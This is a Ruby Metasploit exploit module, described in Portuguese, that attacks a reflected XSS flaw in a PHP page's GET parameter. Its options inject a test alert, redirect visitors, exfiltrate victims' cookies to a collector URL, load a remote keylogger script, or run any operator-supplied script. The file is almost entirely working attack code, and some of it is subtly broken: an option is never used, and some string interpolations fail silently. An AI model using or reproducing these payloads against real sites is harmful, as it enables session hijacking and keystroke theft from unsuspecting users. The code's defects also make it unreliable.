require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'XSS Attack', 
      'Description'    => %q{
        Este módulo explora uma vulnerabilidade XSS encontrada no parametro GET da linguagem PHP. Possui opcoes das quais podem ser costumizadas.
	1 - Envia um script de alert
	2 - Redireciona para um website. Se o utilizador nao escolher um website envia para a pagina inicial do google.
	3 - Permite roubar as cookies das vitimas que acedam o website infetado.
	4 - Injeta um keylogger de modo a receber todas as teclas que sao pressionadas no teclado da vitima.
	5 - Script a escolha do utilizador.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Bruno Ramos' 
        ],
      'References'     =>
        [
          ['URL', 'https://github.com/rapid7/metasploit-framework/wiki'],  
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 10000,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Vulnerable App', { } ],
        ],
      'DisclosureDate' => '14 de Julho de 2016', 
      'DefaultTarget'  => 0))

    register_options(
      [
	OptString.new('WEBSITE',[false, "Introduza o website", ""]),
	OptString.new('OPTION',[false, "Selecione a opcao do módulo", ""]),
	OptString.new('TARGETURI',[true, "Caminho da pagina vulneravel", "/xss/xss.php"]), 
  OptString.new('SCRIPT', [ false, 'Introduza o SCRIPT' ]),
      ],self.class)
  end


def check
    txt = Rex::Text.rand_text_alpha(10)
    res = command_exec("echo #{txt}")

    if res && res.body =~ /#{txt}/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

def command_exec(shell)
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path),
      'vars_get' => {
        'content' => shell
      }
    })
  end

  def exploit
option = datastore['OPTION']
	site = datastore['SCRIPT']
	
        case option
        when "1"
		script = '<script>alert("test");</script>'
		command_exec("#{script}")
	when "2"
		
		if site.nil?
		script = '<script>document.location="http://google.com";</script>'
		command_exec("#{script}")
		else 
		script = "<script>document.location="+ "#{site};</script>"
		command_exec("#{script}")
		end		

	when "3"
		if site.nil?
			script = '<script language="Javascript">document.location="http://www.localhost/xss/cookie.php?cookie=" + document.cookie;</script>'
			command_exec("#{script}")
		else
			script = '<script language="Javascript">document.location=#{site} + document.cookie;</script>'
			command_exec("#{script}")
		end
	when "4"
		if site.nil?
			script = '<script src="http://localhost/xss/keylogger.js"></script>'
			command_exec("#{script}")
		else
			script = '<script src="#{site}></script>'
			command_exec("#{script}")
		end
	
	when "5"
		script = datastore['SCRIPT']
		command_exec("#{script}")	
	else
		puts "Selecione uma opcao do módulo"
	end	
end
end
